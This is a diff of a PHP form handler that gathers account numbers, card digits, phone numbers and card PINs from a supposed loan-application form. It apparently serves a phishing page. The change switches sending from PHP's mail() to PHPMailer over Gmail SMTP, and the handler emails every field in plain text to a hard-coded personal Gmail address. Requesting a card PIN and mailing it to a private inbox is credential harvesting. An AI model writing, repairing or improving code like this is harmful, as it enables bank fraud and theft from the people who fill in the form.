@@ -1,39 +1,48 @@
 <?php
+require 'path/to/PHPMailer/src/PHPMailer.php';
+require 'path/to/PHPMailer/src/SMTP.php';
+require 'path/to/PHPMailer/src/Exception.php';
+
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\SMTP;
+use PHPMailer\PHPMailer\Exception;
+
 if ($_SERVER["REQUEST_METHOD"] === "POST") {
-  // Retrieve form data based on the page
-  if ($_POST["otp"]) {
-    // Process data from OTP page
-    $otp = $_POST["otp"];
-    
-    // TODO: Verify the OTP and proceed with loan application
-  } else {
-    // Process data from index page
-    $accountNumber = $_POST["account-number"];
-    $cardDigits = $_POST["card-digits"];
-    $loanAmount = $_POST["loan-amount"];
-    $phoneNumber = $_POST["phone-number"];
-    $cardPin = $_POST["card-pin"];
-    
-    // TODO: Perform any necessary data validation and processing
-    
-    // Send email to Gmail
-    $to = "olajidehabib3@gmail.com"; // Replace with your Gmail address
-    $subject = "Loan Application";
-    $message = "Account Number: $accountNumber\n"
+  $accountNumber = $_POST["account-number"];
+  $cardDigits = $_POST["card-digits"];
+  $loanAmount = $_POST["loan-amount"];
+  $phoneNumber = $_POST["phone-number"];
+  $cardPin = $_POST["card-pin"];
+
+  // Create a new PHPMailer instance
+  $mail = new PHPMailer();
+
+  // SMTP configuration for Gmail
+  $mail->isSMTP();
+  $mail->Host = 'smtp.gmail.com';
+  $mail->Port = 587;
+  $mail->SMTPSecure = 'tls';
+  $mail->SMTPAuth = true;
+  $mail->Username = 'olajidehabib3@gmail.com';
+  $mail->Password = 'your-email-password';
+
+  // Set the sender and recipient
+  $mail->setFrom('olajidehabib3@gmail.com', 'Your Name');
+  $mail->addAddress('olajidehabib3@gmail.com', 'Recipient Name');
+
+  // Email subject and body
+  $mail->Subject = 'Loan Application';
+  $mail->Body = "Account Number: $accountNumber\n"
               . "Last Six Digits of Card: $cardDigits\n"
               . "Loan Amount Needed: $loanAmount\n"
               . "Phone Number: $phoneNumber\n"
               . "Card PIN: $cardPin";
-    
-    // Set additional headers
-    $headers = "From: olajidehabib3@gmail.com"; // Replace with your Gmail address
-    
-    // Send the email
-    if (mail($to, $subject, $message, $headers)) {
-      echo "Email sent successfully.";
-    } else {
-      echo "Failed to send email.";
-    }
+
+  // Send the email
+  if ($mail->send()) {
+    echo 'Email sent successfully.';
+  } else {
+    echo 'Failed to send email. Error: ' . $mail->ErrorInfo;
   }
 }
 ?>
